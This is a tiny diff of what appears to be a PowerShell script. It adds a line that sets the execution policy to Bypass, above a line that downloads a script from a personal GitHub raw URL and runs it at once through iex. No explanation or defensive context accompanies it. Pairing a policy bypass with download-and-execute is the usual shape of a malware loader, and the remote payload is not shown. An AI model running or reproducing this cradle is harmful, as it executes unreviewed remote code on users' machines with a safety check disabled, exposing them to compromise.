@@ -1,3 +1,4 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/something.ps1" -useb)
 
 
